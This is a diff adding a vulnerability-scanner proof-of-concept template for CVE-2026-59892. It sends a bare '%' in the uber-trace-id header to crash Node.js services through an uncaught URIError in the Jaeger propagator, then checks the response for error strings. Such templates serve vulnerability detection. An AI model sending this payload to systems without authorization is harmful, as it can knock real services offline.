@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过发送包含畸形百分号编码值（裸 %）的 uber-trace-id HTTP 请求头，触发 JaegerPropagator.extract() 中 decodeURIComponent() 的未捕获 URIError，导致 Node.js 进程崩溃"
+id = "POC-AVE-2026-0859"
+name = "CVE-2026-59892 PoC"
+severity = "high"
+tags = ["ave-2026-0859"]
+vuln_id = [
+    "CVE-2026-59892",
+    "AVE-2026-0859",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+uber-trace-id = "%"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "URIError",
+    "500",
+    "Error",
+]
